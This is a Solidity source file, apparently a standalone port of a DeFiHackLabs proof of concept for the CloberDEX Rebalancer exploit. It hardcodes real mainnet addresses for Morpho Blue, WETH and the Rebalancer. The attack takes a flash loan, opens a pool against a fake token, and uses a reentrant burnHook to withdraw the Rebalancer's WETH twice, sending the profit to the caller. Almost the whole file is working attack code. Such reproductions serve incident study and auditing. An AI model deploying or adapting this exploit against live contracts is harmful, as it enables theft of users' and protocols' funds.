// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
// CloberDEX_exp.sol test's testExploit()/onMorphoFlashLoan()/burnHook() logic
// verbatim, but without inheriting forge-std Test/BaseTestWithBalanceLog
// (which depends on the Foundry cheatcode contract being deployed; that
// address has no code in a plain EVM replay, so any cheatcode-gated modifier
// reverts before the real attack logic runs). The test's setUp() step (deploy
// FakeToken, wire up the Morpho/Rebalancer interfaces) is plain Solidity with
// no cheatcode dependency, so it's moved into the constructor unchanged.

type Currency is address;
type FeePolicy is uint24;

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function withdraw(uint256) external;
}

interface IMorphoBuleFlashLoan {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IRebalancer {
    function bookManager() external view returns (address);

    function open(
        IBookManager.BookKey calldata bookKeyA,
        IBookManager.BookKey calldata bookKeyB,
        bytes32 salt,
        address strategy
    ) external returns (bytes32 key);

    function mint(bytes32 key, uint256 amountA, uint256 amountB, uint256 minLpAmount) external payable returns (uint256);

    function burn(bytes32 key, uint256 amount, uint256 minAmountA, uint256 minAmountB) external returns (uint256, uint256);
}

interface IHooks {}

interface IBookManager {
    struct BookKey {
        Currency base;
        uint64 unitSize;
        Currency quote;
        FeePolicy makerPolicy;
        IHooks hooks;
        FeePolicy takerPolicy;
    }

    function open(BookKey calldata key, bytes calldata hookData) external;
}

contract CloberDex {
    address public weth = 0x4200000000000000000000000000000000000006;
    address public morphoBlue = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address public rebalancer = 0x6A0b87D6b74F7D5C92722F6a11714DBeDa9F3895;

    FakeToken fakeToken;
    uint256 public amountToHack;
    uint256 public rebalancerWETH;
    bool public reEntry = false;
    IMorphoBuleFlashLoan public morpho;
    IRebalancer public rebalancerContract;

    constructor() {
        morpho = IMorphoBuleFlashLoan(payable(morphoBlue));
        fakeToken = new FakeToken("Fake Token", "FAKE", 1000 ether);
        rebalancerContract = IRebalancer(rebalancer);
    }

    function testExploit() public {
        rebalancerWETH = IERC20Min(weth).balanceOf(rebalancer);

        amountToHack = rebalancerWETH * 2;

        // 1. Flash Loan
        morpho.flashLoan(weth, amountToHack, "0");

        // 7. Withdraw profit to ETH
        IERC20Min(weth).withdraw(rebalancerWETH);
        payable(msg.sender).call{value: rebalancerWETH}("");
    }

    function onMorphoFlashLoan(uint256 amount, bytes calldata data) external {
        IHooks hooksA = IHooks(address(0x0000000000000000000000000000000000000000));
        Currency baseCurrencyA = Currency.wrap(weth);
        Currency quoteA = Currency.wrap(address(fakeToken));

        IBookManager.BookKey memory bookKeyA = IBookManager.BookKey({
            base: baseCurrencyA,
            unitSize: 1,
            quote: quoteA,
            makerPolicy: FeePolicy.wrap(8888608),
            hooks: hooksA,
            takerPolicy: FeePolicy.wrap(8888708)
        });

        IBookManager.BookKey memory bookKeyB = IBookManager.BookKey({
            base: quoteA,
            unitSize: 1,
            quote: baseCurrencyA,
            makerPolicy: FeePolicy.wrap(8888608),
            hooks: hooksA,
            takerPolicy: FeePolicy.wrap(8888708)
        });

        // 2. Build the pool between WETH and Fake Token
        bytes32 poolKey = rebalancerContract.open(bookKeyA, bookKeyB, "1", address(this));

        // 3. Approve tokens
        fakeToken.approve(rebalancer, type(uint256).max);
        IERC20Min(weth).approve(rebalancer, amountToHack);

        // 4. Add liquidity (mint LP Token)
        rebalancerContract.mint(poolKey, amountToHack, amountToHack, 0);

        // 5. Burn LP Token, extracting WETH from the pool
        rebalancerContract.burn(poolKey, rebalancerWETH, 0, 0);

        IERC20Min(weth).approve(morphoBlue, amount);
    }

    function burnHook(address receiver, bytes32 key, uint256 burnAmount, uint256 lastTotalSupply) external {
        if (reEntry == false) {
            reEntry = true;
            // 6. Extract WETH from the pool again
            IRebalancer(rebalancer).burn(key, rebalancerWETH, 0, 0);
        }
    }

    function mintHook(address receiver, bytes32 key, uint256 amount, uint256 amount2) external {}

    fallback() external payable {}
}

contract FakeToken {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowances;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol, uint256 _initialSupply) {
        name = _name;
        symbol = _symbol;
        totalSupply = _initialSupply;
        balances[msg.sender] = totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(allowances[from][msg.sender] >= amount, "Allowance exceeded");
        require(balances[from] >= amount, "Insufficient balance");
        balances[from] -= amount;
        balances[to] += amount;
        allowances[from][msg.sender] -= amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return allowances[owner][spender];
    }
}
